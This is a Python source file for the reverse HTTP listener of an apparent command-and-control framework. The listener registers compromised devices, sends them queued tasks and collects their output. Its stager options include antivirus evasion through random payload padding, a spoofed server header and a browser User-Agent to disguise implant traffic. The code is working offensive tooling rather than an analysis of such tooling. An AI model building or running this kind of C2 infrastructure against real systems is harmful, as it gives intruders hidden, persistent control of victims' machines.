import logging
import os
import time
from datetime import datetime
from threading import Thread
from typing import TYPE_CHECKING
from uuid import uuid1

from Creator.available import AVAILABLE_ENCODINGS, AVAILABLE_FORMATS
from Database import DeviceModel, ListenerModel, Session
from flask import Flask, Response, cli, jsonify, request
from Handlers.http.reverse import Handler
from Listeners.base import BaseListener
from Utils.options import (AddressType, BooleanType, ChoiceType, IntegerType,
                           Option, OptionPool, StringType, TableType)
from Utils.ui import log, log_connection
from Utils.web import FlaskThread

if TYPE_CHECKING:
    from Commander import Commander


class Listener(BaseListener):
    """The Reverse Http Listener Class"""
    api = Flask(__name__)
    listener_pool = OptionPool([
        Option(
            name="Name",
            description="The name of the listener.",
            type=StringType,
            required=True,
        ),
        Option(
            name="Address",
            description="The address the listener should listen on.",
            type=AddressType,
            required=True,
            default="0.0.0.0"
        ),
        Option(
            name="Port",
            description="The port the listener should listen on.",
            type=IntegerType,
            required=True,
            default=9999
        ),
        Option(
            name="SSL",
            description="True if the listener should use ssl.",
            type=BooleanType,
            default=True
        ),
        Option(
            name="Connection limit",
            _real_name="limit",
            description="How many devices can be connected to one listener at once.",
            type=IntegerType,
            default=5
        ),
        Option(
            name="Server Header",
            _real_name="header",
            description="The Server Header to return",
            type=StringType,
            default="Werkzeug/2.2.2 Python/3.10.7"
        )
    ])
    stager_pool = OptionPool([
        Option(
            name="Name",
            description="The name of the stager.",
            type=StringType,
            required=True,
        ),
        Option(
            name="Listener",
            description="The listener, the stager should connect to.",
            type=TableType(lambda: Session.query(
                ListenerModel).all(), ListenerModel),
            required=True,
            default=1
        ),
        Option(
            name="Encoding",
            description="The encoding to use.",
            type=ChoiceType(AVAILABLE_ENCODINGS, "str"),
            default=AVAILABLE_ENCODINGS[0]
        ),
        Option(
            name="Random size",
            _real_name="random_size",
            description="Add random sized strings to the payload to bypass the AV.",
            type=BooleanType,
            default=False
        ),
        Option(
            name="Timeout",
            description="How often the stager should try to connect, before it will exit.",
            type=IntegerType,
            default=200
        ),
        Option(
            name="Format",
            description="The format of the stager.",
            type=ChoiceType(AVAILABLE_FORMATS, str),
            default=AVAILABLE_FORMATS[0]
        ),
        Option(
            name="Delay",
            description="The delay before the stager should connect to the server.",
            type=IntegerType,
            default=1
        ),
        Option(
            name="Request User-Agent",
            _real_name="user-agent",
            description="The User-Agent to use.",
            type=StringType,
            default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
        ),
        Option(
            name="Proxy address",
            _real_name="proxy_address",
            description="The address of a proxy to use.",
            type=AddressType,
        ),
        Option(
            name="Proxy port",
            _real_name="proxy_port",
            description="The port of a proxy to use.",
            type=IntegerType,
            default=8080
        ),
        Option(
            name="Proxy authentication",
            _real_name="proxy_auth",
            description="The Authentication to use (format=username:password).",
            type=StringType,
            default=""
        ),
        Option(
            name="Different address/domain",
            _real_name="different-address",
            description="Use a different address/domain then specified by the listener to connect to.",
            type=AddressType,
            required=False
        )
    ])

    def __init__(self, commander: "Commander", db_entry: ListenerModel):
        super().__init__(commander, db_entry)
        self.stopped = False
        self.listener_thread: FlaskThread
        self.refresher_thread: Thread
        self.create_api()

    def create_api(self):
        self.api = Flask(__name__)

        @self.api.route("/connect", methods=["POST"])
        def connect():
            data = request.get_json()
            if len(self.handlers) >= self.db_entry.connection_limit:
                log(
                    f"A Stager is trying to connect to '{self.db_entry.name}' but the listeners limit is reached.", "info")
                return "", 404
            try:
                address = data.get("address")
                hostname = data.get("hostname", "")
                device = DeviceModel(
                    name=str(uuid1()),
                    hostname=hostname,
                    address=address,
                    connection_date=datetime.now(),
                    last_online=datetime.now(),
                    listener=self.db_entry
                )
            except:
                return "", 404
            Session.add(device)
            Session.commit()
            log_connection(device)
            self.add_handler(Handler(device))
            return device.name

        @self.api.route("/tasks/<string:name>")
        def get_tasks(name: str = None):
            if name is None:
                return "", 400
            handler = self.get_handler(name)
            if handler is None:
                device: DeviceModel = Session.query(
                    DeviceModel).filter_by(name=name).first()
                if device is not None:
                    handler = Handler(device)
                    self.add_handler(handler)
                    log_connection(device, reconnect=True)
                else:
                    return "", 404
            handler.db_entry.last_online = datetime.now()  # update last online
            Session.commit()
            return jsonify([task.to_json(self.commander, False) for task in handler.db_entry.tasks if task.finished_at is None])

        @self.api.route("/finish/<string:name>", methods=["POST"])
        def finish_task(name: str = None):
            if name is None:
                return "", 404

            handler = self.get_handler(name)
            if handler is None:
                return "", 404

            data = request.get_json()
            id = data.get("id", "")
            output = data.get("output", "")
            success = data.get("success", "").lower() == "true"
            
            task = handler.get_task(id)
            if task is None:
                return "", 404

            task.finish(output, success)
            Session.commit()
            return "", 200

        @self.api.after_request
        def change_headers(r: Response):
            return r

    def start(self):
        if not os.getenv("PHOENIX_DEBUG", "") == "true":
            cli.show_server_banner = lambda *args: None
            logging.getLogger("werkzeug").disabled = True
        self.listener_thread = FlaskThread(
            self.api, self.address, self.port, self.ssl, self.db_entry.name)
        self.refresher_thread = Thread(target=self.refresh_connections,
                                       name=self.db_entry.name+"-Refresher-Thread")
        self.listener_thread.start()
        self.refresher_thread.start()

    def refresh_connections(self):
        while True:
            if self.stopped:
                break
            time.sleep(5)
            try:
                for handler in self.handlers:
                    if not handler.alive():
                        log(f"Device '{handler.name}' disconnected.", "critical")
                        self.remove_handler(handler)
            except Exception as e:
                log(str(e), "error")

    def stop(self):
        self.stopped = True
        self.listener_thread.shutdown()

    def status(self) -> True:
        return self.process.is_alive()
